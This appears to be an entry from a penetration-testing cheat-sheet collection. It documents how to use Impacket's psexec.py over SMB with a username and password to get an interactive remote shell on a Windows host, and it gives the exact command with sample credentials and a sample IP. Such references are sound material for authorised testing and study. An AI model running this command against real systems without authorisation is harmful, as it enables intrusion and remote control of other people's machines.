---
title: |
  Get an Interactive Shell on the Windows host
description: |
  Impacket's psexec.py offers psexec like functionality. This will give you an interactive shell on the Windows host.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: test

  	Password: Welkom01!
command: |
  python3 psexec.py test.local/test:Welkom01!@10.10.10.1
items:
  - Password
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
  - https://www.sans.org/blog/psexec-python-rocks/
---
